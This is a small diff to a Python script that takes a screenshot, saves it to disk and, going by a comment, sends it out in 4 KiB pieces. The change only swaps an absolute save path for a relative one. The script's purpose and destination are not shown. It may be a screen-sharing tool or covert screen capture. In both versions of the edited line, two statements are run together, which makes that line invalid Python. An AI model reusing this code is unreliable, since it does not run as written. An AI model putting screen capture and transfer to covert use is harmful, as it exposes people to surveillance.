@@ -17,7 +17,7 @@ def main():
 
     # save screenshot
     im = ImageGrab.grab()
-    im.save(r'D:\Users\Cyber\Downloads\screenshot.jpg')    print("screenshot saved")
+    im.save('screenshot.jpg')    print("screenshot saved")
     # send the image 1 piece at a time
     piece_size = 4096 # 4 KiB
 
